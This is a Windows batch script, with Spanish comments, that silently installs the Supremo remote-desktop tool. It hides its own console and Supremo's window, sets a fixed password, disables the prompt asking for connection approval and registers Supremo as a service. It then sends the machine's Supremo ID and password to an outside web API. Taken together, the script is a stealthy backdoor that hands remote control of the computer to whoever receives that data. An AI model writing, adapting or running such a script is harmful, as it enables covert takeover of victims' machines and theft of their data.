@echo off
title Instalador Supremo Invisible
color 0A

REM ========== OCULTAR ESTA VENTANA INMEDIATAMENTE ==========
powershell -Command "Add-Type -Name Win32 -Namespace Native -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow();'; $hwnd = [Native.Win32]::GetConsoleWindow(); [Native.Win32]::ShowWindow($hwnd, 0)"

REM A partir de aqui el script corre INVISIBLE pero sigue funcionando

REM ========== CONFIGURACION ==========
set SUPREMO_PASS=Admin123456
set API_URL=https://esfm.vercel.app/api/codes
set INSTALL_PATH=C:\Program Files (x86)\Supremo

REM Verificar si ya esta instalado
if exist "%INSTALL_PATH%\Supremo.exe" (
    goto reconfigurar
)

:instalar
echo [1/6] Descargando Supremo...
powershell -Command "Invoke-WebRequest -Uri 'https://www.nanosystems.it/public/download/Supremo.exe' -OutFile '%TEMP%\Supremo.exe'"

if not exist "%TEMP%\Supremo.exe" (
    echo ERROR: No se pudo descargar Supremo
    pause
    exit
)

echo [2/6] Instalando Supremo...
mkdir "%INSTALL_PATH%" 2>nul
copy "%TEMP%\Supremo.exe" "%INSTALL_PATH%\Supremo.exe" >nul

goto configurar

:reconfigurar
echo Reconfigurando Supremo existente...
taskkill /F /IM Supremo.exe >nul 2>&1
taskkill /F /IM SupremoService.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:configurar
echo %SUPREMO_PASS%| "%INSTALL_PATH%\Supremo.exe" -set-password
"%INSTALL_PATH%\Supremo.exe" -ask-authorization 0
"%INSTALL_PATH%\Supremo.exe" -servicesetup
ping -n 2 127.0.0.1 >nul

start "" "%INSTALL_PATH%\Supremo.exe"
powershell -Command "Start-Sleep -Milliseconds 500; Add-Type -N W -Na N -M '[DllImport(\"user32.dll\")]public static extern IntPtr FindWindow(string c,string t);[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int c);';for($i=0;$i -lt 10;$i++){$h=[N.W]::FindWindow($null,'Supremo');if($h -ne [IntPtr]::Zero){[N.W]::ShowWindow($h,0);break};Start-Sleep -Milliseconds 100}"

for /f "delims=" %%i in ('"%INSTALL_PATH%\Supremo.exe" /get-id 2^>nul') do set SUPREMO_ID=%%i

if "%SUPREMO_ID%"=="" (
    ping -n 3 127.0.0.1 >nul
    for /f "delims=" %%i in ('"%INSTALL_PATH%\Supremo.exe" /get-id 2^>nul') do set SUPREMO_ID=%%i
)

REM Cerrar Supremo (el servicio sigue corriendo)
taskkill /F /IM Supremo.exe >nul 2>&1

REM ========== ENVIAR A LA API ==========
echo Enviando a la API...
powershell -Command "$body = @{code='%SUPREMO_ID%'; password='%SUPREMO_PASS%'} | ConvertTo-Json; try { Invoke-RestMethod -Uri '%API_URL%' -Method Post -Body $body -ContentType 'application/json' | Out-Null; Write-Output 'OK' } catch { Write-Output 'ERROR' }" > "%TEMP%\api_result.txt"
set /p API_RESULT=<"%TEMP%\api_result.txt"
del "%TEMP%\api_result.txt" >nul 2>&1

REM Script completado - Supremo queda corriendo en segundo plano
exit
